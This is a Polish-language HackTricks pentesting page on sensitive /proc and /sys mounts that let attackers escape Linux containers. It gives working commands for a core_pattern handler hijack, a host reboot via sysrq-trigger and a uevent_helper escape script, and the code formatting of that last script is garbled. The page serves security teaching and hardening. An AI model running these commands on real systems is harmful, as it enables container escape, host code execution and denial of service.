# Wrażliwe montaże

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Ekspozycja `/proc` i `/sys` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczące ryzyko bezpieczeństwa, w tym powiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które, jeśli są źle skonfigurowane lub dostępne dla nieautoryzowanego użytkownika, mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczyć informacji wspomagających dalsze ataki. Na przykład, niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor z powodu swojej opartej na ścieżkach natury, pozostawiając `/host/proc` bez ochrony.

**Szczegóły dotyczące każdej potencjalnej luki można znaleźć w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Luki w procfs

### `/proc/sys`

Ten katalog pozwala na modyfikację zmiennych jądra, zazwyczaj za pomocą `sysctl(2)`, i zawiera kilka subkatalogów budzących niepokój:

#### **`/proc/sys/kernel/core_pattern`**

* Opisany w [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Umożliwia zdefiniowanie programu do wykonania przy generowaniu pliku rdzenia z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
*   **Przykład testowania i eksploatacji**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test dostępu do zapisu
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Ustaw niestandardowy handler
sleep 5 && ./crash & # Wywołaj handler
```

#### **`/proc/sys/kernel/modprobe`**

* Szczegółowo opisany w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Zawiera ścieżkę do ładowarki modułów jądra, wywoływanej do ładowania modułów jądra.
*   **Przykład sprawdzania dostępu**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdź dostęp do modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Wspomniane w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Globalny flag, który kontroluje, czy jądro panikuje, czy wywołuje OOM killera, gdy występuje warunek OOM.

#### **`/proc/sys/fs`**

* Zgodnie z [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), zawiera opcje i informacje o systemie plików.
* Dostęp do zapisu może umożliwić różne ataki typu denial-of-service przeciwko hostowi.

#### **`/proc/sys/fs/binfmt_misc`**

* Umożliwia rejestrowanie interpreterów dla nienatywnych formatów binarnych na podstawie ich magicznego numeru.
* Może prowadzić do eskalacji uprawnień lub dostępu do powłoki root, jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny.
* Istotny exploit i wyjaśnienie:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Szczegółowy samouczek: [Link do wideo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Inne w `/proc`

#### **`/proc/config.gz`**

* Może ujawniać konfigurację jądra, jeśli `CONFIG_IKCONFIG_PROC` jest włączone.
* Przydatne dla atakujących do identyfikacji luk w działającym jądrze.

#### **`/proc/sysrq-trigger`**

* Umożliwia wywoływanie poleceń Sysrq, co może powodować natychmiastowe ponowne uruchomienia systemu lub inne krytyczne działania.
*   **Przykład ponownego uruchamiania hosta**:

```bash
echo b > /proc/sysrq-trigger # Ponownie uruchamia hosta
```

#### **`/proc/kmsg`**

* Ujawnia komunikaty z bufora pierścieniowego jądra.
* Może pomóc w exploitach jądra, wyciekach adresów i dostarczyć wrażliwych informacji o systemie.

#### **`/proc/kallsyms`**

* Wymienia eksportowane symbole jądra i ich adresy.
* Kluczowe dla rozwoju exploitów jądra, szczególnie w celu pokonania KASLR.
* Informacje o adresach są ograniczone, gdy `kptr_restrict` jest ustawione na `1` lub `2`.
* Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Interfejs z urządzeniem pamięci jądra `/dev/mem`.
* Historycznie podatny na ataki eskalacji uprawnień.
* Więcej na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Reprezentuje fizyczną pamięć systemu w formacie ELF core.
* Odczyt może ujawniać zawartość pamięci systemu hosta i innych kontenerów.
* Duży rozmiar pliku może prowadzić do problemów z odczytem lub awarii oprogramowania.
* Szczegółowe użycie w [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Alternatywny interfejs dla `/dev/kmem`, reprezentujący wirtualną pamięć jądra.
* Umożliwia odczyt i zapis, a zatem bezpośrednią modyfikację pamięci jądra.

#### **`/proc/mem`**

* Alternatywny interfejs dla `/dev/mem`, reprezentujący pamięć fizyczną.
* Umożliwia odczyt i zapis, modyfikacja całej pamięci wymaga rozwiązania adresów wirtualnych na fizyczne.

#### **`/proc/sched_debug`**

* Zwraca informacje o planowaniu procesów, omijając zabezpieczenia przestrzeni nazw PID.
* Ujawnia nazwy procesów, identyfikatory i identyfikatory cgroup.

#### **`/proc/[pid]/mountinfo`**

* Dostarcza informacji o punktach montażowych w przestrzeni nazw montażu procesu.
* Ujawnia lokalizację `rootfs` kontenera lub obrazu.

### Luki w `/sys`

#### **`/sys/kernel/uevent_helper`**

* Używane do obsługi `uevent` urządzeń jądra.
* Zapis do `/sys/kernel/uevent_helper` może wykonać dowolne skrypty po wyzwoleniu `uevent`.
*   **Przykład eksploatacji**: %%%bash

#### Tworzy ładunek

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Znajduje ścieżkę hosta z montażu OverlayFS dla kontenera

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Ustawia uevent\_helper na złośliwego pomocnika

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Wyzwala uevent

echo change > /sys/class/mem/null/uevent

#### Odczytuje wynik

cat /output %%%

#### **`/sys/class/thermal`**

* Kontroluje ustawienia temperatury, potencjalnie powodując ataki DoS lub uszkodzenia fizyczne.

#### **`/sys/kernel/vmcoreinfo`**

* Ujawnia adresy jądra, potencjalnie kompromitując KASLR.

#### **`/sys/kernel/security`**

* Zawiera interfejs `securityfs`, umożliwiający konfigurację modułów bezpieczeństwa Linux, takich jak AppArmor.
* Dostęp może umożliwić kontenerowi wyłączenie swojego systemu MAC.

#### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**

* Ujawnia interfejsy do interakcji z zmiennymi EFI w NVRAM.
* Błędna konfiguracja lub eksploatacja mogą prowadzić do zablokowanych laptopów lub nieuruchamialnych maszyn hosta.

#### **`/sys/kernel/debug`**

* `debugfs` oferuje interfejs debugowania "bez zasad" do jądra.
* Historia problemów z bezpieczeństwem z powodu swojej nieograniczonej natury.

### Odniesienia

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Zrozumienie i wzmacnianie kontenerów Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Wykorzystywanie uprzywilejowanych i nieuprzywilejowanych kontenerów Linux](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
